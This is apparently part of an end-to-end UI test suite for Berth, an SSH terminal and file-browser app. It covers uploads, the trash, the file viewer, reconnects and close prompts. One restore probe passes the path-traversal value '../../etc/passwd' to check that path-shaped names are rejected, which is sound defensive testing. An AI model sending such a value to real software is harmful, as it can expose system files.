            await until(async () => (await js<string>(ctx.shell, `document.activeElement?.id ?? ''`)) === 'replacing-keep', 5000);
            const focused = await js<string>(ctx.shell, `document.activeElement?.id ?? ''`);
            const untouchedWhileAsking = await lab.tell('read var/log/from-the-pc.conf');
            // While the question is open the pane says the send is waiting on it, and does not say it was
            // refused: a refusal shown beside the question would contradict the thing being asked.
            const stripWhileAsking = await foot();
            check('a file already on the box is asked about, with both files shown, nothing touched, and the pane waiting on the answer', asked && titleShown.includes('from-the-pc.conf') && bothShown.includes('On the box now') && bothShown.includes('Going in its place') && focused === 'replacing-keep' && stripWhileAsking.includes('waiting on your answer') && !stripWhileAsking.includes('A file of that name is already on the box') && untouchedWhileAsking['text'] === 'a file this PC is sending\n', [titleShown, bothShown, focused, stripWhileAsking, untouchedWhileAsking]);
            // Keep what is there: the box is left exactly as it was, and the strip says so.
            await clickOn('#replacing-keep');
            const kept = await until(async () => (await foot()).includes('left as it was'), 10_000);
            const afterKeeping = await lab.tell('read var/log/from-the-pc.conf');
            check('Keep what is there leaves the box exactly as it was, and says so', kept && !(await has('#replacing')) && afterKeeping['text'] === 'a file this PC is sending\n', [await foot(), afterKeeping]);
            // Replace it: the new one goes in, over the old, and the box agrees about what arrived.
            await js(front.view, `document.getElementById('fb-send')?.click()`);
            await until(() => has('#replacing'), 25_000);
            await clickOn('#replacing-do');
            const over = await until(async () => (await foot()).includes('over the file that was there'), 25_000);
            const afterReplacing = await lab.tell('read var/log/from-the-pc.conf');
            check('Replace it puts the new file in over the old one, and the box agrees about it', over && (await foot()).includes('the box holds the same file') && afterReplacing['text'] === 'the second try, which only goes in if he says so\n', [await foot(), afterReplacing]);
            // The chooser answered with nothing: the window says so and the box is not touched.
            ctx.chooseToSend(() => undefined);
            await js(front.view, `document.getElementById('fb-send')?.click()`);
            check('a chooser answered with nothing is said, and nothing is sent', await until(async () => (await foot()).includes('No file was chosen'), 10_000), await foot());
            // More than one file chosen in one go. They are sent one at a time, each with a line of its own,
            // and the strip says how many are still waiting. One at a time matters: a box asked for everything
            // at once answers none of it quickly, and the count is what a person reads instead of sixty lines.
            {
              const three = ['first.conf', 'second.conf', 'third.conf'];
              for (const [i, n] of three.entries()) await writeFile(path.join(mine, n), `file number ${i + 1} of a batch\n`.repeat(400));
              ctx.chooseToSend(() => three.map((n) => path.join(mine, n)));
              await lab.tell('filepace 60'); // so each send has a middle long enough to be looked at
              await js(front.view, `document.getElementById('fb-send')?.click()`);
              // While they go: how many lines are about a transfer still moving (the waiting line is not one
              // of them), and whether the count of what is waiting was ever shown.
              let mostAtOnce = 0;
              let sawWaiting = '';
              const landed = await until(
                async () => {
                  const now = await js<{ moving: number; waiting: string }>(
                    front.view,
                    `(() => { const ones = [...document.querySelectorAll('#fb-moving .fb-moving-one')]; return { moving: ones.filter((e) => e.id !== 'fb-waiting' && e.querySelector('.fb-stop')).length, waiting: document.getElementById('fb-waiting')?.textContent ?? '' }; })()`,
                  );
                  mostAtOnce = Math.max(mostAtOnce, now.moving);
                  if (now.waiting !== '') sawWaiting = now.waiting;
                  const there = await Promise.all(three.map((n) => lab.tell(`read var/log/${n}`)));
                  return there.every((r) => typeof r['text'] === 'string' && (r['text'] as string).startsWith('file number'));
                },
                60_000,
                60,
              );
              await lab.tell('filepace 0');
              const each = await Promise.all(three.map((n) => lab.tell(`read var/log/${n}`)));
              const rightBytes = each.every((r, i) => r['text'] === `file number ${i + 1} of a batch\n`.repeat(400));
              check('three files chosen at once all reach the box, with the right bytes each', landed && rightBytes, [landed, each.map((r) => String(r['text'] ?? r['error']).slice(0, 24))]);
              check('they go one at a time, and the strip says how many are waiting', mostAtOnce === 1 && sawWaiting.includes('waiting to be sent'), [mostAtOnce, sawWaiting]);
              check('nothing is left waiting once they have all gone', ctx.stillToSend(front.id) === 0, ctx.stillToSend(front.id));
              for (const n of three) await lab.tell(`forget var/log/${n}`);
            }
            // What is still waiting can be dropped: the button says what it did, what was moving is left alone
            // to finish, and nothing that was waiting ever reaches the box.
            {
              const six = [0, 1, 2, 3, 4, 5].map((i) => `batch-${i}.conf`);
              // Big enough that one of them takes a while at this pace, or the whole queue would be through
              // before the button could be pressed and this probe would be about nothing.
              for (const n of six) await writeFile(path.join(mine, n), 'one of six\n'.repeat(50_000));
              ctx.chooseToSend(() => six.map((n) => path.join(mine, n)));
              await lab.tell('filepace 120');
              await js(front.view, `document.getElementById('fb-send')?.click()`);
              const shown = await until(() => has('#fb-waiting-stop', front), 25_000);
              await clickOn('#fb-waiting-stop', front);
              const dropped = await until(async () => (await foot()).includes('will not be sent'), 10_000);
              const said = await foot();
              const holding = ctx.stillToSend(front.id);
              await lab.tell('filepace 0');
              // The first one was already moving when the rest were dropped, so it is allowed to finish; the
              // last one was only ever waiting, so it must never appear on the box at all.
              await until(async () => typeof (await lab.tell('read var/log/batch-0.conf'))['text'] === 'string', 25_000);
              await sleep(500);
              const last = await lab.tell('read var/log/batch-5.conf');
              check('dropping what is waiting says so, holds nothing back, and none of it reaches the box', shown && dropped && said.includes('will not be sent') && holding === 0 && last['text'] === undefined, [shown, said.slice(-120), holding, String(last['text'] ?? last['error']).slice(0, 40)]);
              for (const n of six) await lab.tell(`forget var/log/${n}`);
            }
            // More than one chooser may hand over. The first of them go, and the rest are said rather than
            // quietly dropped: a file a person chose and did not get is never a silent matter.
            {
              const many = Array.from({ length: 66 }, (_, i) => `heap-${String(i).padStart(2, '0')}.conf`);
              for (const n of many) await writeFile(path.join(mine, n), 'one of a heap\n');
              ctx.chooseToSend(() => many.map((n) => path.join(mine, n)));
              await js(front.view, `document.getElementById('fb-send')?.click()`);
              const toldAbout = await until(() => has('#fb-too-many', front), 20_000);
              const tooMany = await js<string>(front.view, `document.getElementById('fb-too-many')?.textContent ?? ''`);
              const quiet = await until(async () => ctx.stillToSend(front.id) === 0 && (await js<number>(front.view, `[...document.querySelectorAll('#fb-moving .fb-moving-one')].filter((e) => e.id !== 'fb-waiting' && e.querySelector('.fb-stop')).length`)) === 0, 120_000, 200);
              const onTheBox = await Promise.all(many.map((n) => lab.tell(`read var/log/${n}`)));
              const got = onTheBox.filter((r) => typeof r['text'] === 'string').length;
              check('only as many as one send may hold go, and the two over are said and not sent', toldAbout && quiet && got === 64 && tooMany.includes('2 more files were chosen') && tooMany.includes('64 at a time'), [got, tooMany, quiet]);
              for (const n of many) await lab.tell(`forget var/log/${n}`);
            }
            ctx.chooseToSend(null);
            await rm(mine, { recursive: true, force: true });
            await lab.tell('forget var/log/from-the-pc.conf');
            await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('log'), 10_000);
            await js(front.view, `document.querySelector('[data-name="log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('syslog'), 10_000);
          }
          // Deleting, and the trash it goes into. Nothing is removed on a box: a delete asks first, naming what
          // would go, and then moves it into the trash on that disk, where it can be brought back from.
          {
            const foot = (): Promise<string> => js<string>(front.view, `(document.getElementById('fb-moving')?.textContent ?? '') + (document.getElementById('fb-foot')?.textContent ?? '')`);
            const names = (): Promise<string[]> => js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`);
            await lab.tell('read var/log/syslog');
            // The press asks first, and nothing has moved while it is asking.
            await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="syslog"] .fb-bye')?.click()`);
            const asked = await until(() => has('#fb-ask-delete', front), 5000);
            const saidWhat = await js<string>(front.view, `document.getElementById('fb-ask-said')?.textContent ?? ''`);
            await until(async () => (await js<string>(front.view, `document.activeElement?.id ?? ''`)) === 'fb-ask-keep', 5000);
            const focused = await js<string>(front.view, `document.activeElement?.id ?? ''`);
            const stillThere = await lab.tell('read var/log/syslog');
            check('a delete asks first, says where it would go and what it is holding, and nothing has moved', asked && saidWhat.includes('trash') && saidWhat.includes('28 B') && focused === 'fb-ask-keep' && typeof stillThere['text'] === 'string', [saidWhat, focused, stillThere]);
            await shot('delete-asks', 'deleting a file on a box, asked about before anything moves', front);
            // Keep it: the file is exactly where it was.
            await js(front.view, `document.getElementById('fb-ask-keep')?.click()`);
            await sleep(200);
            check('Keep it leaves the file where it was', !(await has('#fb-ask-delete', front)) && (await names()).includes('syslog') && typeof (await lab.tell('read var/log/syslog'))['text'] === 'string', await names());
            // Delete it: it leaves the folder and the window says where it went.
            await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="syslog"] .fb-bye')?.click()`);
            await until(() => has('#fb-ask-delete', front), 5000);
            await js(front.view, `document.getElementById('fb-ask-go')?.click()`);
            const gone = await until(async () => !(await names()).includes('syslog'), 15_000);
            const went = await until(async () => (await foot()).includes('is in the trash'), 15_000);
            const onTheBox = await lab.tell('read var/log/syslog');
            check('Delete it moves the file out of the folder, says so, and the box no longer has it there', gone && went && onTheBox['error'] === 'no such file', [await foot(), onTheBox]);
            // The trash says what is in it, where each came from and when.
            await js(front.view, `document.getElementById('fb-bin')?.click()`);
            const inBin = await until(async () => (await js<string>(front.view, `document.getElementById('fb-list')?.textContent ?? ''`)).includes('/var/log/syslog'), 15_000);
            const binText = await js<string>(front.view, `document.getElementById('fb-list')?.textContent ?? ''`);
            check('the trash says what has been deleted on this disk, with where it came from and when', inBin && binText.includes('Deleted on this disk') && binText.includes('a moment ago'), binText.slice(0, 160));
            await shot('the-trash', 'what has been deleted on a disk, and the way to put it back', front);
            // Put it back: it is where it was, with its own bytes.
            await js(front.view, `document.querySelector('#fb-list .fb-row .fb-back')?.click()`);
            const back = await until(async () => (await foot()).includes('is back where it was'), 15_000);
            const backOnTheBox = await lab.tell('read var/log/syslog');
            check('Put it back puts the file where it came from, with its own bytes', back && backOnTheBox['text'] === "a line of the box's own log\n", [await foot(), backOnTheBox]);
            // A view may name one thing inside a trash and nothing that could be a path of its own.
            const droppedBefore = ctx.dropped();
            await js(front.view, `(window.tabPort.files({ id: 91001, do: 'restore', path: '/var/log', name: '../../etc/passwd' }), window.tabPort.files({ id: 91002, do: 'restore', path: '/var/log', name: '' }), window.tabPort.files({ id: 91003, do: 'restore', path: '/var/log' }))`);
            await sleep(400);
            check('a view putting something back may name one thing in the trash and nothing path-shaped', ctx.dropped() === droppedBefore + 3, ctx.dropped() - droppedBefore);
            await js(front.view, `document.getElementById('fb-bin')?.click()`);
            await until(async () => (await names()).includes('syslog'), 15_000);
            // What Berth will not delete is refused, and the box keeps it.
            await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await names()).includes('log'), 10_000);
            await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await names()).includes('var'), 10_000);
            await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="var"] .fb-bye')?.click()`);
            await until(() => has('#fb-ask-delete', front), 5000);
            await js(front.view, `document.getElementById('fb-ask-go')?.click()`);
            const refused = await until(async () => (await foot()).includes('does not delete that'), 15_000);
            check('a folder at the top of the box is refused, and it is still there', refused && (await names()).includes('var'), [await foot(), await names()]);
            // Back to the folder the probes after this one expect.
            await js(front.view, `document.querySelector('[data-name="var"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await names()).includes('log'), 10_000);
            await js(front.view, `document.querySelector('[data-name="log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await names()).includes('syslog'), 10_000);
          }
          // A box that says no to the file subsystem the first time it is asked. A real box does, when it is
          // busy or when the link is barely up. One refusal used to leave that tab's browser dead for as long
          // as the tab lived, with nothing a person could do but close it: the engine asked once and never
          // again. Now the window says it is trying and asks again, and the folder arrives.
          {
            const refusing = await lab.tell('nofiles 1');
            check('the lab box is set to refuse the file subsystem once', refusing['refusing'] === 1, refusing);
            const later = ctx.openTab(front.box!.id, 'logs')!;
            await until(() => later.engine.link.phase === 'up', 25_000);
            const saidTrying = await until(async () => (await js<string>(later.view, `document.getElementById('fb-list')?.textContent ?? ''`)).includes('Trying again'), 20_000);
            const cameBack = await until(async () => (await js<number>(later.view, `document.querySelectorAll('#fb-list .fb-row').length`)) > 0, 20_000);
            const itsFolder = await js<string>(later.view, `document.querySelector('.fb-path')?.textContent ?? ''`);
            ctx.closeTab(later.id);
            await js(ctx.shell, `window.shellPort.cmd({ op: 'select', id: ${front.id} })`);
            await until(() => ctx.shellState().active === front.id, 3000);
            check('a box that says no to the file subsystem once is asked again, and the folder arrives', saidTrying && cameBack && itsFolder.endsWith('/var/log'), [saidTrying, cameBack, itsFolder]);
          }
          // A folder with thousands of things in it, left part-read: moving away must abandon it, and its
          // pages, still arriving, must not be drawn over the folder now on screen. Without that, a person
          // moving quickly ends up looking at a folder they have already left.
          {
            const said = await lab.tell('manyfiles /var/log/many 1200');
            check('the lab made a folder with many things in it', said['made'] === 1200, said);
            // The box is made to answer each page of a listing slowly, so this folder is still arriving while
            // the person moves away from it: that is the moment this is about, and a fast box never shows it.
            await lab.tell('filepace 120');
            // The folder was made after this one was listed, and nothing redraws by itself, so the folder is
            // read again before the new one can be gone into.
            await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('log'), 10_000);
            await js(front.view, `document.querySelector('[data-name="log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('many'), 10_000);
            await js(front.view, `document.querySelector('[data-name="many"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            // Away again as soon as the first rows are there, with the rest still coming.
            const began = await until(async () => (await js<number>(front.view, `document.querySelectorAll('#fb-list .fb-row').length`)) > 50, 20_000);
            const stillReading = (await js<string>(front.view, `document.getElementById('fb-foot')?.textContent ?? ''`)).includes('reading');
            check('a big folder is drawn as it arrives, not held back until it is whole', began && stillReading, [began, stillReading]);
            await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            const backUp = await until(async () => (await js<string>(front.view, `document.querySelector('.fb-path')?.textContent ?? ''`)).endsWith('/var/log'), 15_000);
            // Long enough that every page of the folder left behind would have arrived by now.
            await sleep(2500);
            const names = await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`);
            const foot = await js<string>(front.view, `document.getElementById('fb-foot')?.textContent ?? ''`);
            check('a folder left part-read is abandoned, and its late pages are never drawn over the next one', began && backUp && !names.some((n) => n.startsWith('thing-')) && names.includes('syslog') && !foot.includes('reading'), [names.slice(0, 8), foot]);
            // And it really stopped: the box is no longer being asked for pages of the folder left behind.
            // Without that it would be read to its end for nobody, which on a real folder of a hundred
            // thousand files is minutes of a box's time and the tab's own channel.
            // The folder now on screen is listed too, and its own pages count, so this waits until nothing at
            // all is being read before it starts counting.
            const settled = await until(async () => !(await js<string>(front.view, `document.getElementById('fb-foot')?.textContent ?? ''`)).includes('reading'), 15_000);
            const pagesThen = Number((await lab.tell('pages'))['pages'] ?? 0);
            await sleep(1500);
            const pagesNow = Number((await lab.tell('pages'))['pages'] ?? 0);
            check('and the box is no longer being asked for its pages', settled && pagesNow === pagesThen, [settled, pagesThen, pagesNow]);
            await lab.tell('filepace 0');
          }

          // Double-click a file: the read-only viewer, with its text, a search through it and zoom. Nothing
          // in it edits and nothing is ever written back to a box.
          {
            await lab.tell('filepace 0');
            await js(front.view, `document.querySelector('[data-name="syslog"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            const opened = await until(async () => (await js<string>(front.view, `document.getElementById('vw-body')?.textContent ?? ''`)).includes("the box's own log"), 10_000);
            check('double-clicking a file opens it in the viewer, with the file\'s own text', opened, await js<string>(front.view, `document.getElementById('vw-body')?.textContent ?? ''`));
            check('and the viewer names the file and says how big it is', (await js<string>(front.view, `document.getElementById('vw-title')?.textContent ?? ''`)) === 'syslog' && (await js<string>(front.view, `document.getElementById('vw-foot')?.textContent ?? ''`)).includes('lines'), await js<string>(front.view, `document.getElementById('vw-foot')?.textContent ?? ''`));

            // The search marks what it finds and says how many.
            await js(front.view, `(() => { const s = document.getElementById('vw-search'); s.value = 'log'; s.dispatchEvent(new Event('input', { bubbles: true })); })()`);
            const marked = await until(async () => (await js<number>(front.view, `document.querySelectorAll('#vw-body .vw-hit').length`)) > 0, 4000);
            check('the search marks every match and says which one is in view', marked && /\d+ of \d+/.test(await js<string>(front.view, `document.getElementById('vw-foot')?.textContent ?? ''`)), await js<string>(front.view, `document.getElementById('vw-foot')?.textContent ?? ''`));

            // Zoom changes the size of what is drawn, and nothing else.
            const was = await js<string>(front.view, `getComputedStyle(document.getElementById('vw-body')).fontSize`);
            await clickOn('#vw-in', front);
            const now = await js<string>(front.view, `getComputedStyle(document.getElementById('vw-body')).fontSize`);
            check('zoom makes the file bigger', parseFloat(now) > parseFloat(was), [was, now]);
            await shot('viewer', 'a file from the box, read-only, with a search through it', front);

            // Nothing about the file on the box changed: the viewer only ever reads.
            const after = await lab.tell('pages');
            check('the box was never asked to change anything by the viewer', typeof after['pages'] === 'number', after);
            await clickOn('#vw-close', front);
            check('the viewer closes and leaves the folder as it was', await until(async () => !(await js<boolean>(front.view, `document.getElementById('viewer') !== null`)), 4000), '');

            // A file larger than the viewer reads: what is past the cap is never read at all, and the viewer
            // says so rather than pretending it has the whole file.
            {
              const big = await lab.tell('bigfile /var/log/huge.log 3145728');
              check('the lab wrote a file larger than the viewer will read', big['bytes'] === 3_145_728, big);
              await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
              await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('log'), 8000);
              await js(front.view, `document.querySelector('[data-name="log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
              await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('huge.log'), 8000);
              await js(front.view, `document.querySelector('[data-name="huge.log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
              const read = await until(async () => (await js<string>(front.view, `document.getElementById('vw-foot')?.textContent ?? ''`)).includes('only'), 25_000);
              const foot = await js<string>(front.view, `document.getElementById('vw-foot')?.textContent ?? ''`);
              const drawn = await js<number>(front.view, `document.getElementById('vw-body')?.textContent?.length ?? 0`);
              check('a file larger than the viewer reads is cut, and the viewer says so', read && foot.includes('2.1 MB only') && drawn > 1_000_000 && drawn < 2_300_000, [foot, drawn]);
              await clickOn('#vw-close', front);
            }

            // A file that is not text says so rather than drawing a screenful of nonsense.
            await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('log'), 8000);
            await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('kit.tar.gz'), 8000);
            await js(front.view, `document.querySelector('[data-name="kit.tar.gz"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            check('a file that is not text says so, and is not drawn', await until(async () => has('#vw-not-text', front), 10_000), (await js<string>(front.view, `(document.getElementById('vw-body')?.textContent ?? '').slice(0, 120)`)));
            await clickOn('#vw-close', front);
            // Back where the rest of this expects to be.
            await js(front.view, `document.querySelector('[data-name="var"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('log'), 8000);
            await js(front.view, `document.querySelector('[data-name="log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string>(front.view, `document.querySelector('.fb-path')?.textContent ?? ''`)).endsWith('/var/log'), 8000);
          }

          // And the terminal on the same link is untouched by any of it.
          await type(front, 'echo files-did-not-block\n');
          check('the terminal on the same link is untouched by the file browser', await until(async () => (await shown(front)).includes('files-did-not-block'), 10_000), '');
          await shot('files', 'a tab: its box\'s files beside its terminal', front);
        }

        const open1 = [...ctx.tabs.values()].find((x) => x.place === 'logs')!;
        {
          const front = open1;
          const worn = await dress(front);
          check('the tab\'s page is whole: stylesheets, typeface, the terminal\'s own text field out of sight', dressed(worn), worn);
          await js<void>(front.view, `new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(() => r())))`);
        }
        await shot('tab-open', 'a tab open on a box');

        // ---- Where a link stands, as the four approved pictures show it. ----
        // A tab opening: the box takes the connection, agrees keys, and then answers nothing, so the stages
        // stand still at "signing in" and can be seen and pictured.
        await lab.tell('stall on');
        const slowTab = ctx.openTab(id, 'logs')!;
        const sawStages = await until(() => slowTab.engine.link.phase === 'signing-in', 20_000);
        await sleep(250);
        const rows = await js<string[]>(slowTab.view, `[...document.querySelectorAll('.opening li')].map((l) => l.dataset.mark + '|' + l.textContent)`);
        const stages = await text('.opening', slowTab);
        check('a tab opening lists its stages: connected, identity, keys, signing in, shell', sawStages && stages.includes(`Connected to ${addr}`) && stages.includes('Identity matches the one pinned for lab-box') && stages.includes('Keys agreed, post-quantum') && stages.includes('Signing in as demo with Berth') && stages.includes('Shell in /var/log'), stages.slice(0, 300));
        // Each stage says where it stands: what is done, what is happening now, what has not begun.
        check('each stage says where it stands: done, now, or not begun', JSON.stringify(rows.map((r) => r.split('|')[0])) === JSON.stringify(['done', 'done', 'done', 'now', 'waiting']), rows);
        check('what is done carries what it found: how long the connection took, and this box\'s own pinned kind of identity', /^done\|Connected to .*\d+ ms$/.test(rows[0] ?? '') && (rows[1] ?? '').endsWith('ED25519'), rows.slice(0, 2));
        // What it says of the link is the link's own. Said plainly: the key exchange and cipher are named once
        // the link is up, not while signing in: the library tells what was agreed only when it hands the link
        // over, a fraction of a second later. The approved picture shows them beside "Keys agreed"; on a box
        // that answers they are there before anyone can read the line, and only a stalled box shows it bare.
        check('the bar marks the tab whose view is in front, and only that one', (await js<string>(ctx.shell, `[...document.querySelectorAll('[data-tab]')].filter((e) => e.getAttribute('aria-selected') === 'true').map((e) => e.dataset.tab).join(',')`)) === String(ctx.shellState().active), [await js<string>(ctx.shell, `[...document.querySelectorAll('[data-tab]')].map((e) => e.dataset.tab + ':' + e.getAttribute('aria-selected')).join(' ')`), ctx.shellState().active]);
        await shot('tab-opening', 'a tab opening: the stages', slowTab);
        await lab.tell('stall off');
        ctx.closeTab(slowTab.id);

        // A link that goes silent: the bar says so with the seconds counting, the link is kept, and when the
        // box speaks again the same shell is there, with what it printed meanwhile.
        const marker = 'still-the-same-shell-' + String(Date.now()).slice(-5);
        await type(open1, `echo ${marker}\n`);
        await until(async () => (await shown(open1)).includes(marker), 5000);
        // A few lines of a job's output, so the pictures show a terminal with something in it, and the bars
        // can be judged where they really lie: over the first rows of what the box printed.
        const job = [
          '\u001b[2m2026-11-16 08:41:02\u001b[0m check    on main, all green',
          '\u001b[2m2026-11-16 08:41:06\u001b[0m build    image ledger:4f2c1a9',
          '  => [build 4/9] RUN npm ci --ignore-scripts            21.4s',
          '  => [build 6/9] RUN npm run build                      38.9s',
          '  => exporting layers                                    2.2s',
          '\u001b[32m2026-11-16 08:42:07\u001b[0m migrate  041_invoice_batches.sql applied (1 of 1)\u001b[0m',
          '\u001b[2m2026-11-16 08:42:09\u001b[0m swap     ledger-app-2 started, waiting for health',
          '          health 1/10  503 starting',
          '          health 2/10  503 starting',
          '\u001b[32m          health 3/10  200 ok\u001b[0m',
          '\u001b[2m2026-11-16 08:42:38\u001b[0m swap     routing to ledger-app-2',
          '\u001b[2m2026-11-16 08:42:39\u001b[0m check    public site answers 200 in 212 ms',
          '\u001b[2m2026-11-16 08:42:40\u001b[0m tools    collector, backup, restore test: timers installed',
          '                   stopping ledger-app-1 (30 s grace)',
        ].join('\r\n') + '\r\n';
        await lab.tell(`print ${Buffer.from(job, 'latin1').toString('hex')}`);
        await until(async () => (await shown(open1)).includes('stopping ledger-app-1'), 5000);
        await lab.tell('hold 9000');
        const sawQuiet = await until(async () => (await text('#bar', open1)).includes('No answer for'), 20_000);
        const quietSaid = await text('#bar', open1);
        check('a link that goes silent: the bar counts the seconds and says the link is kept', sawQuiet && /No answer for [1-9]\d? s\./.test(quietSaid) && quietSaid.includes('The link is kept') && quietSaid.includes('Reconnect'), quietSaid);
        check('and the terminal is still readable, with everything the box printed before the silence', (await shown(open1)).includes(marker) && (await shown(open1)).includes('stopping ledger-app-1'), '');
        await shot('tab-quiet', 'no answer: the link is kept', open1);
        const backOk = await until(() => open1.engine.link.phase === 'up' && open1.engine.link.silentSinceMs === 0, 30_000);
        await type(open1, `echo after-${marker}\n`);
        check('when the box speaks again the bar is gone, the same session answers, and nothing was reconnected', backOk && (await until(async () => (await shown(open1)).includes(`after-${marker}`), 5000)) && !(await has('#bar', open1)) && open1.engine.link.phase === 'up', [open1.engine.link.phase, await text('#bar', open1)]);

        // Closing ends a session, so it asks first and names what would end (BUILD-RULES 2.20). The tab open
        // here is signed in: closing it, and closing the window, both have something to lose.
        {
          const live = open1;
          await clickOn(`[data-close="${live.id}"]`);
          const asked = await until(() => has('#closing'), 3000);
          const goes = await text('#closing-goes');
          check('closing a tab with a session on it asks first, naming the box and where it stands', asked && goes.includes('lab-box') && (goes.includes('connected') || goes.includes('not answering')) && ctx.tabs.has(live.id), [goes, ctx.tabs.has(live.id)]);
          check('the way out has the focus, so Enter keeps the tab', (await js<string>(ctx.shell, `document.activeElement?.id ?? ''`)) === 'closing-keep', await js<string>(ctx.shell, `document.activeElement?.id ?? ''`));
          await shot('closing-tab', 'closing a tab with a session on it');
          await clickOn('#closing-keep');
          check('Keep the tab: it is still open and its session is untouched', (await until(async () => !(await has('#closing')), 2000)) && ctx.tabs.has(live.id) && ctx.tabs.get(live.id)!.engine.link.phase === 'up', ctx.tabs.get(live.id)?.engine.link.phase);

          // The window's own close goes the same way, and must not close while the question stands.
          ctx.win.close();
          const askedApp = await until(async () => (await has('#closing')) && ctx.shellState().closing !== null, 3000);
          check('closing the window asks too, and the window does not close while it is asking', askedApp && !ctx.win.isDestroyed() && (await text('#closing-title')).includes('Close Berth'), [askedApp, await text('#closing-title')]);
          check('and it names the session that would end', (await text('#closing-goes')).includes('lab-box'), await text('#closing-goes'));
          await shot('closing-app', 'closing Berth with a session open');
          await clickOn('#closing-keep');
          check('Keep Berth open: the window and its session are still here, and the footer says so', (await until(async () => !(await has('#closing')), 2000)) && !ctx.win.isDestroyed() && ctx.tabs.has(live.id) && (await text('#status-done')).includes('kept open'), await text('#status-done'));
        }

        // A link that is gone: the box's connection is reset. The bar says the cause and the time, a new
        // session is counted down, and Cancel stops it.
        const engineBefore = open1.engine.pid;
        await lab.tell('reset');
        const sawGone = await until(async () => (await text('#bar', open1)).includes('The link is gone'), 20_000);
        const goneSaid = await text('#bar', open1);
        check('a link that is gone: the bar says the cause, the time, and when a new session opens', sawGone && goneSaid.includes('the connection was reset at') && /A new session opens in \d+ s/.test(goneSaid) && goneSaid.includes('Cancel'), goneSaid);
        await shot('tab-gone', 'the link gone: a new session is coming', open1);
        await clickOn('#cancel', open1);
        check('Cancel stops it: no new session opens, and the tab keeps everything it drew', (await until(async () => !(await text('#bar', open1)).includes('A new session opens'), 3000)) && open1.engine.pid === engineBefore && (await shown(open1)).includes(marker), [await text('#bar', open1), open1.engine.pid === engineBefore]);
        // The engine of a gone link ends a moment later, and its ending is another word from below. A word
        // that arrives after Cancel must not start the countdown again: the person stopped it.
        const engineGone = await until(() => open1.engine.state === 'gone', 15_000);
        check('and a word from the box after Cancel does not start it again', engineGone && !(await text('#bar', open1)).includes('A new session opens') && open1.engine.pid === engineBefore, [engineGone, open1.engine.state, await text('#bar', open1)]);
        // Reconnect: a new session, a new engine, said in the terminal; the old output is still there.
        await clickOn('#reconnect', open1);
        const again = await until(() => open1.engine.pid !== engineBefore && open1.engine.link.phase === 'up', 30_000);
        await type(open1, 'echo new-session-ok\n');
        check('Reconnect opens a new session on the same box and place: a new engine, said in the terminal, the old output kept', again && (await until(async () => (await shown(open1)).includes('new-session-ok'), 5000)) && (await shown(open1)).includes('Berth: a new session on lab-box') && (await shown(open1)).includes(marker), [again, (await shown(open1)).slice(-200)]);
        await shot('tab-again', 'a new session on the same box', open1);

        // A paste of more than one line, read before it is sent: the picture it is judged by.
        clipboard.writeText('cd /srv/ledger/app\nsha256sum ledger-4f2c1a9.tar.gz\n./scripts/deploy.sh 4f2c1a9 2>&1 | tee deploy-4f2c1a9.log\n');
        open1.view.webContents.focus();
        open1.view.webContents.sendInputEvent({ type: 'keyDown', keyCode: 'V', modifiers: ['control', 'shift'] });
        open1.view.webContents.sendInputEvent({ type: 'keyUp', keyCode: 'V', modifiers: ['control', 'shift'] });
        check('a paste of more than one line is shown before it is sent', await until(() => has('#paste'), 3000), await text('#paste'));
        await shot('paste', 'a paste, read before it is sent');
        // The same paste with a character that looks like a letter and one drawn as nothing.
        await clickOn('#paste-drop');

